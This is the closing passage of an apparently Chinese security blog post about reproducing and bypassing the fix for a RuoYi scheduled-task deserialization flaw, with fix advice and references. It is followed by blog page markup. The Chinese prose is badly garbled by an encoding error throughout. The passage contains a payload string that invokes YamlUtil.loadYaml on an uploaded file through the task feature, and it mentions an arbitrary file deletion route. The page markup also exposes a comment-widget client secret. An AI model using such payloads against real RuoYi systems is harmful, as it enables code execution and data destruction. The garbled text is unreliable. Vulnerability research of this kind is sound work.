<p>é™¤äº†ä¾èµ–åŒ…ä¸­çš„ç±»ï¼Œè¿˜æ‰¾äº†ä¸€åœˆé¡¹ç›®ä¸­çš„ç±»ï¼Œå‘ç°ä¸€ä¸ªyamlçš„å·¥å…·ç±»<code>YamlUtil</code>çš„<code>loadYaml</code>æ–¹æ³•å¯èƒ½åˆé€‚ï¼Œäºæ˜¯åˆç®€å•çš„æ„é€ äº†ä¸ªpayloadï¼š</p>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.ruoyi.common.utils.YamlUtil.loadYaml(&apos;D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt&apos;)</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡åˆ™æ˜¯æŠ›å‡ºäº†<code>FileNotFoundException</code>ï¼Œå› ä¸º<code>getResourceAsStream</code>æ–¹æ³•æ— æ³•è·å–ClassPathå¤–çš„æ–‡ä»¶ï¼Œå®åœ¨æ˜¯å­¦è‰ºä¸ç²¾ã€‚</p>
<p>åç»­åœ¨é¡¹ç›®ä¸­è¿˜å‘ç°äº†å¦ä¸€ä¸ªå¯åˆ©ç”¨çš„ç‚¹ï¼Œ<code>FileUtils</code>å·¥å…·ç±»çš„<code>deleteFile</code>æ–¹æ³•å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶åˆ é™¤ï¼Œä½†æœ¬æ–‡çš„ç›®æ ‡æ˜¯getshellï¼Œè€Œä¸”åˆ©ç”¨æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œè¿™é‡Œå°±ä¸å†å…·è¿°ã€‚</p>
<h2 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h2><p>å€Ÿç€æ¼æ´æ¡ä¾‹çš„é¢å¸ƒï¼Œè¿™é‡ŒçŒ®ä¸Šæœ¬äººçš„ä¿®å¤å»ºè®®ã€‚å…¶å®åœ¨æˆ‘ä¸Šä¸€ä¸ªå®¡è®¡çš„ç³»ç»Ÿä¸­ä¹Ÿæ˜¯æœ‰å®šæ—¶ä»»åŠ¡åŠŸèƒ½çš„ï¼Œä¹Ÿæ˜¯é€šè¿‡åå°„çš„æ–¹å¼è°ƒç”¨ä»»åŠ¡çš„å®ç°ä»£ç ï¼Œä½†æ˜¯ç”¨æˆ·åªèƒ½ä¼ å…¥å®ç°è¿™ä¸ªæ–¹æ³•çš„ç±»åï¼Œç³»ç»Ÿå®ä¾‹åŒ–è¿™ä¸ªç±»å¹¶è°ƒç”¨ç‰¹å®šçš„æ–¹æ³•ã€‚</p>
<p>åœ¨è¿™ä¸ªç³»ç»Ÿä¸­å½“ç„¶å¯ä»¥ä½¿ç”¨é»‘ç™½åå•çš„æ–¹å¼å¯¹å¯å®ä¾‹åŒ–çš„ç±»è¿›è¡Œè¿‡æ»¤ï¼Œä½†è¿™æ ·ä¼¼ä¹ä¿®å¤å¾—ä¸å½»åº•ã€‚å¦‚æœä½¿ç”¨è°ƒç”¨ç‰¹å®šæ–¹æ³•çš„æ–¹å¼æ‰§è¡Œä»»åŠ¡ï¼Œåªéœ€è®¾ç½®ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„æ–¹æ³•åï¼Œè¿™ä¸ªæ¼æ´å°±å¾ˆéš¾åˆ©ç”¨èµ·æ¥äº†ï¼Œå®é™…ä¸Šè¿™ä¸ªç³»ç»Ÿç”¨åˆ°çš„quartzä»»åŠ¡è°ƒåº¦æ¡†æ¶å°±æ˜¯ä½¿ç”¨ç±»ä¼¼çš„æ–¹å¼ï¼Œä½œä¸ºè°ƒåº¦ä»»åŠ¡çš„ç±»ç»­å®ç°quartzçš„<code>Job</code>æ¥å£ï¼Œå¹¶é‡å†™<code>execute</code>æ–¹æ³•ã€‚</p>
<p>å½“ç„¶ï¼Œä»¥ä¸Šåªæ˜¯ä¸ªäººå¯¹è¿™ä¸ªæ¼æ´ä¿®å¤çš„å°å°çœ‹æ³•ï¼Œä»…ä¾›å‚è€ƒã€‚</p>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>æœ¬æ¥æƒ³æ‰¾åˆ°æ›´é«˜å¤§ä¸Šçš„payloadï¼Œæœ€åè¿˜åªæ˜¯æ‰¾åˆ°è¿‡æ»¤ä¸ä¸¥çš„é—®é¢˜ï¼Œæ€»çš„æ¥è¯´è¿˜æ˜¯å­¦è‰ºä¸ç²¾ã€‚ä¸è¿‡äº†è§£åˆ°å„ç§è¡¨è¾¾å¼è¿˜æ˜¯é¢‡æœ‰æ”¶è·ï¼Œæœ€åå„ä½å¸ˆå‚…è‹¥æƒ³åˆ°å…¶ä»–payloadï¼Œæœ›ä¸åèµæ•™ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/r00tuser/p/14693462.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/14693462.html</a></p>
<p><a href="https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E</a></p>
<p><a href="https://blog.csdn.net/weixin_41725792/article/details/109818161" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41725792/article/details/109818161</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/183902092" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/183902092</a></p>

        </div>
        
            <ul class="post-copyright">
            <li><strong>æœ¬æ–‡æ ‡é¢˜ï¼š</strong><a href="http://127.0.0.1/2021/09/04/è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡/">è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡</a></li>
            <li><strong>æœ¬æ–‡ä½œè€…ï¼š</strong><a href="http://127.0.0.1">P1ay2win</a></li>
            <li><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="http://127.0.0.1/2021/09/04/è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡/">http://127.0.0.1/2021/09/04/è‹¥ä¾ååºåˆ—æ¼æ´å¤ç°åŠå…¶ä¿®å¤ç»•è¿‡/</a></li>
            <li><strong>å‘å¸ƒæ—¶é—´ï¼š</strong>2021-09-04</li>
            <li><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
            </li>
            </ul>
        
        
        <div class="level is-size-7 is-uppercase">
            <div class="level-start">
                <div class="level-item">
                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
                    <a class="has-link-grey -link" href="/tags/ååºåˆ—åŒ–/">ååºåˆ—åŒ–</a>
                </div>
            </div>
        </div>
        
        
        
    </div>
</div>





<div class="card card-transparent">
    <div class="level post-navigation is-flex-wrap is-mobile">
        
        <div class="level-start">
            <a class="level level-item has-link-grey  article-nav-prev" href="/2021/09/14/æ²¡ä»€ä¹ˆå¥½åˆ†æçš„Shiro-550/">
                <i class="level-item fas fa-chevron-left"></i>
                <span class="level-item">æ²¡ä»€ä¹ˆå¥½åˆ†æçš„Shiro-550</span>
            </a>
        </div>
        
        
        <div class="level-end">
            <a class="level level-item has-link-grey  article-nav-next" href="/2021/08/24/JAVAååºåˆ—åŒ–å­¦ä¹ /">
                <span class="level-item">JAVAååºåˆ—åŒ–å­¦ä¹ </span>
                <i class="level-item fas fa-chevron-right"></i>
            </a>
        </div>
        
    </div>
</div>



<div class="card">
    <div class="card-content">
        <h3 class="title is-5 has-text-weight-normal">è¯„è®º</h3>
        
<div id="comment-container"></div>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
<script>
    var gitalk = new Gitalk({
        clientID: '372fb49f2243341bf93b',
        clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
        id: '157754ae0d7790156f2c1545c58a66e7',
        repo: 'p1ay2win.github.io',
        owner: 'p1ay2win',
        admin: "p1ay2win",
        createIssueManually: false,
        distractionFreeMode: false
    })
    gitalk.render('comment-container')
</script>


    </div>
</div>

</div>
                




<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
    
        
<div class="card widget">
    <div class="card-content">
        <nav class="level">
            <div class="level-item has-text-centered" style="flex-shrink: 1">
                <div>
                    
                    <figure class="image is-128x128 has-mb-6">
                        <img class="is-rounded" src="/images/header.png" alt="p1ay2win">
                    </figure>
                    
                    <p class="is-size-4 is-block">
                        p1ay2win
                    </p>
                    
                    
                    <p class="is-size-6 is-block">
                        ä»–ä»¬çš„çˆ±ä¸é£åï¼Œåªé—®è‡ªç”±ï¼Œåªé—®ç››æ”¾ï¼Œåªé—®æ·±æƒ…ï¼Œåªé—®åˆå¿ƒï¼Œåªé—®å‹‡æ•¢ï¼Œæ— é—®è¥¿ä¸œã€‚
                    </p>
                    
                    
                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
                        <i class="fas fa-map-marker-alt has-mr-7"></i>
                        <span>CN</span>
                    </p>
                    
                </div>
            </div>
        </nav>
        <nav class="level is-mobile">
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        æ–‡ç« 
                    </p>
                    <p class="title has-text-weight-normal">
                        39
                    </p>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        åˆ†ç±»
                    </p>
                    <p class="title has-text-weight-normal">
                        7
                    </p>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        æ ‡ç­¾
                    </p>
                    <p class="title has-text-weight-normal">
                        35
                    </p>
                </div>
            </div>
        </nav>
        
        <div class="level">
            <a class="level-item button is-link is-rounded" href="https://p1ay2win.github.io" target="_blank">
                å…³æ³¨æˆ‘</a>
        </div>
        
        
        
        <div class="level is-mobile">
            
            <a class="level-item button is-white is-marginless" target="_blank"
                title="Github" href="https://github.com/P1ay2win/">
                
                <i class="fab fa-github"></i>
                
            </a>
            
            <a class="level-item button is-white is-marginless" target="_blank"
                title="Twitter" href="https://twitter.com/p1ay2win">
                
                <i class="fab fa-twitter"></i>
                
            </a>
            
            <a class="level-item button is-white is-marginless" target="_blank"
                title="RSS" href="/atom.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
            
        </div>
        
    </div>
</div>

    
        

    <div class="card widget column-left is-sticky" id="toc">
        <div class="card-content">
            <div class="menu">
                <h3 class="menu-label">
                    ç›®å½•
                </h3>
                <ul class="menu-list"><li>
        <a class="is-flex" href="#å‰è¨€">
        <span class="has-mr-6">1</span>
        <span>å‰è¨€</span>
        </a></li><li>
        <a class="is-flex" href="#ä¿¡æ¯æ”¶é›†">
        <span class="has-mr-6">2</span>
        <span>ä¿¡æ¯æ”¶é›†</span>
        </a></li><li>
        <a class="is-flex" href="#æ¼æ´å¤ç°">
        <span class="has-mr-6">3</span>
        <span>æ¼æ´å¤ç°</span>
        </a></li><li>
        <a class="is-flex" href="#è¿‡æ»¤ä¸ä¸¥">
        <span class="has-mr-6">4</span>
        <span>è¿‡æ»¤ä¸ä¸¥</span>
        </a></li><li>
        <a class="is-flex" href="#ä¸€äº›å…¶ä»–å°è¯•">
        <span class="has-mr-6">5</span>
        <span>ä¸€äº›å…¶ä»–å°è¯•</span>
        </a></li><li>
        <a class="is-flex" href="#ä¿®å¤å»ºè®®">
        <span class="has-mr-6">6</span>
        <span>ä¿®å¤å»ºè®®</span>
        </a></li><li>
        <a class="is-flex" href="#åè®°">
        <span class="has-mr-6">7</span>
        <span>åè®°</span>
        </a></li><li>
        <a class="is-flex" href="#å‚è€ƒ">
        <span class="has-mr-6">8</span>
        <span>å‚è€ƒ</span>
        </a></li></ul>
            </div>
        </div>
    </div>


    
    
        <div class="column-right-shadow is-hidden-widescreen ">
        
        </div>
    
</div>


                

            </div>
        </div>
    </section>
    <footer class="footer">
    <div class="container">
        <div class="level">
            <div class="level-start has-text-centered-mobile">
                <a class="footer-logo is-block has-mb-6" href="/">
                
                    P1ay2win&#39;s blog
                
                </a>
                <p class="is-size-7">
                &copy; 2022 P1ay2win&nbsp;
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡  <i class="fa fa-user-md"></i>  è®¿å®¢æ•°<span id="busuanzi_value_site_uv"></span>äºº<br>
                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
                
                </p>
            </div>
            <div class="level-end">
            
                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
                        
                        <i class="fab fa-creative-commons"></i>
                        
                    </a>
                </p>
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
                        
                        <i class="fab fa-creative-commons-by"></i>
                        
                    </a>
                </p>
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://p1ay2win.github.io">
                        
                        <i class="fab fa-github"></i>
                        
                    </a>
                </p>
                
                </div>
            
            </div>
        </div>
    </div>
</footer>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
<script>moment.locale("zh-CN");</script>

<script>
var IcarusThemeSettings = {
    article: {
        highlight: {
            clipboard: true,
            fold: 'unfolded'
        }
    }
};
</script>


    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>



    
    
<script src="/js/animation.js"></script>

    
    
<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
<script src="/js/gallery.js" defer></script>

    
    
<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
            my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
<script>
    document.addEventListener("DOMContentLoaded", function () {
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        });
    });
</script>

    
    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    MathJax.Hub.Config({
        'HTML-CSS': {
            matchFontHeight: false
        },
        SVG: {
            matchFontHeight: false
        },
        CommonHTML: {
            matchFontHeight: false
        },
        tex2jax: {
            inlineMath: [
                ['$','$'],
                ['\\(','\\)']
            ]
        }
    });
});
</script>
    
    
<a id="back-to-top" title="å›åˆ°é¡¶ç«¯" href="javascript:;">
    <i class="fas fa-chevron-up"></i>
</a>
<script src="/js/back-to-top.js" defer></script>

    
    
    
    
    
    
    
    
    
    
    


<script src="/js/main.js" defer></script>

    
    <div class="searchbox ins-search">
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..." />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'æ–‡ç« ',
                PAGES: 'é¡µé¢',
                CATEGORIES: 'åˆ†ç±»',
                TAGS: 'æ ‡ç­¾',
                UNTITLED: '(æ— æ ‡é¢˜)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>
<script src="/js/insight.js" defer></script>
<link rel="stylesheet" href="/css/search.css">
<link rel="stylesheet" href="/css/insight.css">
    
</body>
</html>
